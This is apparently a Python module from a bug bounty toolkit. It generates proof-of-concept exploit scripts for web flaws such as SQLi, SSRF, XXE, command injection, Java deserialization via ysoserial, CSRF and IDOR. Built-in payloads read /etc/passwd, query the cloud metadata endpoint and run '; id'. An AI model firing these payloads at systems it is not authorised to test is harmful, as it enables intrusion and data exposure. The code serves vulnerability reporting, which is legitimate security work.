"""Automatic Proof of Concept generator for confirmed findings.

Generates executable PoC scripts (Python, curl, JavaScript) from
finding details to include in bug bounty reports.
"""

from __future__ import annotations

from typing import Any
from urllib.parse import quote


def generate_poc(
    vuln_type: str,
    target: str,
    method: str = "GET",
    parameter: str = "",
    payload: str = "",
    headers: dict[str, str] | None = None,
    body: str = "",
    token: str = "",
    description: str = "",
    language: str = "python",
) -> dict[str, Any]:
    """Generate a Proof of Concept script for a vulnerability.

    Args:
        vuln_type: Vulnerability type (sqli, xss, ssrf, cors, idor, csrf, etc.)
        target: Target URL
        method: HTTP method
        parameter: Vulnerable parameter
        payload: Exploit payload
        headers: Custom headers
        body: Request body
        token: Auth token (for IDOR/BOLA)
        description: Finding description
        language: Output language (python, curl, javascript)

    Returns:
        Dict with poc_script, language, and metadata.
    """
    generators = {
        "python": _generate_python_poc,
        "curl": _generate_curl_poc,
        "javascript": _generate_js_poc,
    }

    generator = generators.get(language, _generate_python_poc)
    script = generator(
        vuln_type=vuln_type,
        target=target,
        method=method,
        parameter=parameter,
        payload=payload,
        headers=headers or {},
        body=body,
        token=token,
        description=description,
    )

    return {
        "vuln_type": vuln_type,
        "target": target,
        "language": language,
        "poc_script": script,
        "usage": _usage_instructions(language, vuln_type),
    }


def _generate_python_poc(
    vuln_type: str,
    target: str,
    method: str,
    parameter: str,
    payload: str,
    headers: dict[str, str],
    body: str,
    token: str,
    description: str,
) -> str:
    """Generate Python PoC script."""
    lines = [
        '"""',
        f"Proof of Concept — {vuln_type.upper()}",
        f"Target: {target}",
        f"Description: {description}" if description else "",
        '"""',
        "",
        "import requests",
        "import sys",
        "",
    ]

    if vuln_type == "sqli":
        lines.extend(_python_sqli(target, method, parameter, payload, headers))
    elif vuln_type == "xss":
        lines.extend(_python_xss(target, parameter, payload, headers))
    elif vuln_type == "ssrf":
        lines.extend(_python_ssrf(target, parameter, payload, headers))
    elif vuln_type == "cors":
        lines.extend(_python_cors(target, headers))
    elif vuln_type in ("idor", "bola"):
        lines.extend(_python_idor(target, token, headers))
    elif vuln_type == "csrf":
        lines.extend(_python_csrf(target, method, body, headers))
    elif vuln_type == "open_redirect":
        lines.extend(_python_open_redirect(target, parameter, payload, headers))
    elif vuln_type == "xxe":
        lines.extend(_python_xxe(target, payload, headers))
    elif vuln_type == "rce":
        lines.extend(_python_rce(target, method, parameter, payload, headers))
    elif vuln_type == "ssti":
        lines.extend(_python_ssti(target, parameter, payload, headers))
    elif vuln_type in ("deserialization", "java_deser", "php_deser", "python_deser"):
        lines.extend(_python_deserialization(target, payload, headers, body))
    elif vuln_type == "prototype_pollution":
        lines.extend(_python_prototype_pollution(target, payload, headers))
    else:
        lines.extend(_python_generic(target, method, parameter, payload, headers, body))

    return "\n".join(line for line in lines if line is not None)


def _python_sqli(target: str, method: str, param: str, payload: str, headers: dict) -> list[str]:
    h = _format_python_headers(headers)
    if method.upper() == "GET":
        return [
            f'TARGET = "{target}"',
            f'PARAM = "{param}"',
            f'PAYLOAD = "{payload}"',
            "",
            f"url = f'{{TARGET}}?{{PARAM}}={{PAYLOAD}}'",
            f"resp = requests.get(url, headers={h})",
            "",
            "# Check for SQL error signatures",
            "indicators = ['SQL syntax', 'mysql_fetch', 'ORA-', 'SQLSTATE', 'syntax error']",
            "for indicator in indicators:",
            "    if indicator.lower() in resp.text.lower():",
            "        print(f'[VULNERABLE] SQL error detected: {indicator}')",
            "        print(f'Status: {resp.status_code}')",
            "        print(f'Response snippet: {resp.text[:500]}')",
            "        sys.exit(0)",
            "",
            "print('[NOT VULNERABLE] No SQL error signatures found')",
        ]
    return [
        f'TARGET = "{target}"',
        f'PARAM = "{param}"',
        f'PAYLOAD = "{payload}"',
        "",
        f"data = {{PARAM: PAYLOAD}}",
        f"resp = requests.post(TARGET, data=data, headers={h})",
        "",
        "indicators = ['SQL syntax', 'mysql_fetch', 'ORA-', 'SQLSTATE']",
        "for indicator in indicators:",
        "    if indicator.lower() in resp.text.lower():",
        "        print(f'[VULNERABLE] {indicator}')",
        "        sys.exit(0)",
    ]


def _python_xss(target: str, param: str, payload: str, headers: dict) -> list[str]:
    h = _format_python_headers(headers)
    return [
        f'TARGET = "{target}"',
        f'PARAM = "{param}"',
        f'PAYLOAD = "{payload}"',
        "",
        f"url = f'{{TARGET}}?{{PARAM}}={{PAYLOAD}}'",
        f"resp = requests.get(url, headers={h})",
        "",
        "if PAYLOAD in resp.text:",
        "    print(f'[VULNERABLE] XSS payload reflected in response')",
        "    print(f'Status: {resp.status_code}')",
        "    # Find the reflection context",
        "    idx = resp.text.find(PAYLOAD)",
        "    context = resp.text[max(0,idx-50):idx+len(PAYLOAD)+50]",
        "    print(f'Context: {context}')",
        "else:",
        "    print('[NOT VULNERABLE] Payload not reflected')",
    ]


def _python_ssrf(target: str, param: str, payload: str, headers: dict) -> list[str]:
    h = _format_python_headers(headers)
    internal = payload or "http://169.254.169.254/latest/meta-data/"
    return [
        f'TARGET = "{target}"',
        f'PARAM = "{param}"',
        f'INTERNAL_URL = "{internal}"',
        "",
        f"url = f'{{TARGET}}?{{PARAM}}={{INTERNAL_URL}}'",
        f"resp = requests.get(url, headers={h}, timeout=10)",
        "",
        "# Check for cloud metadata or internal content",
        "ssrf_indicators = ['ami-id', 'instance-id', 'root:x:0:0', 'compute/metadata']",
        "for indicator in ssrf_indicators:",
        "    if indicator in resp.text:",
        "        print(f'[VULNERABLE] SSRF confirmed — internal content: {indicator}')",
        "        print(f'Response: {resp.text[:500]}')",
        "        sys.exit(0)",
        "",
        "print('[NOT VULNERABLE] No internal content detected')",
    ]


def _python_cors(target: str, headers: dict) -> list[str]:
    return [
        f'TARGET = "{target}"',
        "",
        "# Test with evil origin",
        "test_origins = ['https://evil.com', 'null', 'https://target.com.evil.com']",
        "for origin in test_origins:",
        "    resp = requests.get(TARGET, headers={'Origin': origin})",
        "    acao = resp.headers.get('Access-Control-Allow-Origin', '')",
        "    acac = resp.headers.get('Access-Control-Allow-Credentials', '')",
        "    if origin in acao or acao == '*':",
        "        print(f'[VULNERABLE] CORS misconfiguration')",
        "        print(f'  Origin: {origin}')",
        "        print(f'  ACAO: {acao}')",
        "        print(f'  ACAC: {acac}')",
        "        if acac.lower() == 'true':",
        "            print('  [CRITICAL] Credentials allowed with reflected origin!')",
    ]


def _python_idor(target: str, token: str, headers: dict) -> list[str]:
    return [
        f'TARGET = "{target}"',
        f'TOKEN = "{token}"',
        "",
        "# Test accessing other users' resources",
        "for user_id in range(1, 20):",
        "    url = f'{TARGET}/{user_id}'",
        "    resp = requests.get(url, headers={'Authorization': f'Bearer {TOKEN}'})",
        "    if resp.status_code == 200:",
        "        print(f'[ACCESSIBLE] ID={user_id}: {resp.text[:200]}')",
        "    else:",
        "        print(f'[BLOCKED] ID={user_id}: {resp.status_code}')",
    ]


def _python_csrf(target: str, method: str, body: str, headers: dict) -> list[str]:
    return [
        f'TARGET = "{target}"',
        "",
        "# CSRF PoC — generates HTML page that auto-submits",
        "html = '''",
        "<html>",
        "<body>",
        f'<form id="csrf" method="{method}" action="{target}">',
    ] + [
        f'  <input type="hidden" name="{k}" value="{v}" />'
        for k, v in _parse_body_params(body)
    ] + [
        "</form>",
        "<script>document.getElementById('csrf').submit();</script>",
        "</body>",
        "</html>",
        "'''",
        "",
        "with open('csrf_poc.html', 'w') as f:",
        "    f.write(html)",
        "print('CSRF PoC saved to csrf_poc.html — open in victim browser')",
    ]


def _python_open_redirect(target: str, param: str, payload: str, headers: dict) -> list[str]:
    h = _format_python_headers(headers)
    return [
        f'TARGET = "{target}"',
        f'PARAM = "{param}"',
        f'REDIRECT_TO = "{payload or "https://evil.com"}"',
        "",
        f"url = f'{{TARGET}}?{{PARAM}}={{REDIRECT_TO}}'",
        f"resp = requests.get(url, headers={h}, allow_redirects=False)",
        "",
        "location = resp.headers.get('Location', '')",
        "if REDIRECT_TO in location:",
        "    print(f'[VULNERABLE] Open redirect to: {location}')",
        "    print(f'Status: {resp.status_code}')",
        "else:",
        "    print(f'[NOT VULNERABLE] Redirect: {location}')",
    ]


def _python_xxe(target: str, payload: str, headers: dict) -> list[str]:
    h = _format_python_headers(headers)
    xxe_payload = payload or (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<data>&xxe;</data>'
    )
    return [
        f'TARGET = "{target}"',
        f'PAYLOAD = """{xxe_payload}"""',
        "",
        "headers = {'Content-Type': 'application/xml'}",
        "resp = requests.post(TARGET, data=PAYLOAD, headers=headers)",
        "",
        "if 'root:x:0:0' in resp.text:",
        "    print('[VULNERABLE] XXE — file content extracted')",
        "    print(f'Response: {resp.text[:500]}')",
        "else:",
        "    print('[NOT VULNERABLE] No file content in response')",
    ]


def _python_rce(target: str, method: str, param: str, payload: str, headers: dict) -> list[str]:
    h = _format_python_headers(headers)
    return [
        f'TARGET = "{target}"',
        f'PARAM = "{param}"',
        f'PAYLOAD = "{payload or "; id"}"',
        "",
        f"url = f'{{TARGET}}?{{PARAM}}={{PAYLOAD}}'",
        f"resp = requests.get(url, headers={h})",
        "",
        "import re",
        "if re.search(r'uid=\\d+\\(\\w+\\)', resp.text):",
        "    print('[VULNERABLE] RCE confirmed!')",
        "    print(f'Output: {resp.text[:500]}')",
        "else:",
        "    print('[NOT VULNERABLE] No command execution detected')",
    ]


def _python_ssti(target: str, param: str, payload: str, headers: dict) -> list[str]:
    h = _format_python_headers(headers)
    payload = payload or "{{31337*1337}}"
    expected = "41897569"
    return [
        f'TARGET = "{target}"',
        f'PARAM = "{param or "q"}"',
        f'PAYLOAD = "{payload}"',
        f'EXPECTED_RENDER = "{expected}"',
        "",
        "import urllib.parse",
        "encoded = urllib.parse.quote(PAYLOAD)",
        "url = f'{TARGET}?{PARAM}={encoded}'",
        f"resp = requests.get(url, headers={h})",
        "if EXPECTED_RENDER in resp.text:",
        "    print(f'[CONFIRMED] SSTI: template rendered {PAYLOAD!r} -> {EXPECTED_RENDER}')",
        "else:",
        "    print('[NOT CONFIRMED] Expected render not found')",
        "print(f'Status: {resp.status_code}')",
        "print(f'Response excerpt: {resp.text[:500]}')",
    ]


def _python_deserialization(target: str, payload: str, headers: dict, body: str) -> list[str]:
    h = _format_python_headers(headers)
    return [
        f'TARGET = "{target}"',
        "",
        "# Java deserialization PoC — requires ysoserial.jar",
        "# Generates CommonsCollections1 gadget chain with sleep(6) command",
        "import subprocess, time",
        "try:",
        "    gadget = subprocess.check_output(",
        "        ['java', '-jar', 'ysoserial.jar', 'CommonsCollections1', 'sleep 6'],",
        "        stderr=subprocess.DEVNULL",
        "    )",
        "except FileNotFoundError:",
        "    print('[ERROR] ysoserial.jar not found — download from GitHub')",
        "    raise SystemExit(1)",
        "",
        "start = time.time()",
        f"resp = requests.post(TARGET, data=gadget, headers={{**{h}, 'Content-Type': 'application/x-java-serialized-object'}})",
        "elapsed = time.time() - start",
        "if elapsed >= 5.5:",
        "    print(f'[CONFIRMED] Deserialization: {elapsed:.1f}s delay (sleep gadget executed)')",
        "else:",
        "    print(f'[NOT CONFIRMED] No time delay detected ({elapsed:.1f}s)')",
    ]


def _python_prototype_pollution(target: str, payload: str, headers: dict) -> list[str]:
    h = _format_python_headers(headers)
    canary = payload or "kambo_pp_canary_41897569"
    return [
        f'TARGET = "{target}"',
        f'CANARY = "{canary}"',
        "",
        "import json",
        "# Test __proto__ pollution",
        f"pp_payload = json.dumps({{'__proto__': {{'polluted': CANARY}}, 'name': 'test'}})",
        f"resp = requests.post(TARGET, data=pp_payload, headers={{**{h}, 'Content-Type': 'application/json'}})",
        "if CANARY in resp.text:",
        "    print('[CONFIRMED] Prototype Pollution: canary propagated to response')",
        "    print(f'Response excerpt: {resp.text[:500]}')",
        "else:",
        "    print('[NOT CONFIRMED] Canary not found in response')",
        "",
        "# Also test constructor.prototype bypass",
        f"cp_payload = json.dumps({{'constructor': {{'prototype': {{'polluted': CANARY}}}}, 'name': 'test'}})",
        f"resp2 = requests.post(TARGET, data=cp_payload, headers={{**{h}, 'Content-Type': 'application/json'}})",
        "if CANARY in resp2.text:",
        "    print('[CONFIRMED] Prototype Pollution via constructor.prototype')",
    ]


def _python_generic(target: str, method: str, param: str, payload: str, headers: dict, body: str) -> list[str]:
    h = _format_python_headers(headers)
    if method.upper() == "GET":
        return [
            f'TARGET = "{target}"',
            f'PARAM = "{param}"',
            f'PAYLOAD = "{payload}"',
            "",
            f"url = f'{{TARGET}}?{{PARAM}}={{PAYLOAD}}'",
            f"resp = requests.get(url, headers={h})",
            "print(f'Status: {{resp.status_code}}')",
            "print(f'Response: {{resp.text[:1000]}}')",
        ]
    return [
        f'TARGET = "{target}"',
        f'DATA = "{body or f"{param}={payload}"}"',
        "",
        f"resp = requests.post(TARGET, data=DATA, headers={h})",
        "print(f'Status: {{resp.status_code}}')",
        "print(f'Response: {{resp.text[:1000]}}')",
    ]


def _generate_curl_poc(
    vuln_type: str,
    target: str,
    method: str,
    parameter: str,
    payload: str,
    headers: dict[str, str],
    body: str,
    token: str,
    description: str,
) -> str:
    """Generate curl PoC command."""
    parts = ["curl", "-v"]

    if method.upper() != "GET":
        parts.append(f"-X {method.upper()}")

    for k, v in headers.items():
        parts.extend(["-H", f"'{k}: {v}'"])

    if token:
        parts.extend(["-H", f"'Authorization: Bearer {token}'"])

    if body:
        parts.extend(["-d", f"'{body}'"])
    elif parameter and payload and method.upper() != "GET":
        parts.extend(["-d", f"'{parameter}={payload}'"])

    if parameter and payload and method.upper() == "GET":
        sep = "&" if "?" in target else "?"
        url = f"{target}{sep}{parameter}={quote(payload)}"
    else:
        url = target

    parts.append(f"'{url}'")

    header = f"# PoC — {vuln_type.upper()}\n# {description}\n\n" if description else f"# PoC — {vuln_type.upper()}\n\n"
    return header + " \\\n  ".join(parts)


def _generate_js_poc(
    vuln_type: str,
    target: str,
    method: str,
    parameter: str,
    payload: str,
    headers: dict[str, str],
    body: str,
    token: str,
    description: str,
) -> str:
    """Generate JavaScript/fetch PoC."""
    h = dict(headers)
    if token:
        h["Authorization"] = f"Bearer {token}"

    if parameter and payload and method.upper() == "GET":
        sep = "&" if "?" in target else "?"
        url = f"{target}{sep}{parameter}={payload}"
    else:
        url = target

    lines = [
        f"// PoC — {vuln_type.upper()}",
        f"// {description}" if description else "",
        "",
        f"const url = '{url}';",
        "",
        "fetch(url, {",
        f"  method: '{method.upper()}',",
    ]

    if h:
        lines.append(f"  headers: {_format_js_headers(h)},")

    if body or (parameter and payload and method.upper() != "GET"):
        b = body or f"{parameter}={payload}"
        lines.append(f"  body: '{b}',")

    lines.extend([
        "})",
        ".then(r => r.text())",
        ".then(text => {",
        "  console.log('Status:', text.length);",
        "  console.log('Response:', text.substring(0, 500));",
        "})",
        ".catch(err => console.error('Error:', err));",
    ])

    return "\n".join(line for line in lines if line is not None)


# --- Helpers ---

def _format_python_headers(headers: dict[str, str]) -> str:
    if not headers:
        return "{}"
    return repr(headers)


def _format_js_headers(headers: dict[str, str]) -> str:
    if not headers:
        return "{}"
    pairs = ", ".join(f"'{k}': '{v}'" for k, v in headers.items())
    return f"{{{pairs}}}"


def _parse_body_params(body: str) -> list[tuple[str, str]]:
    """Parse URL-encoded body into key-value pairs."""
    if not body:
        return [("action", "change")]
    pairs = []
    for part in body.split("&"):
        if "=" in part:
            k, v = part.split("=", 1)
            pairs.append((k, v))
    return pairs


def _usage_instructions(language: str, vuln_type: str) -> str:
    if language == "python":
        return "pip install requests && python poc.py"
    if language == "curl":
        return "Run in terminal (requires curl)"
    if language == "javascript":
        return "Run in browser console or Node.js"
    return f"Execute the {language} script"
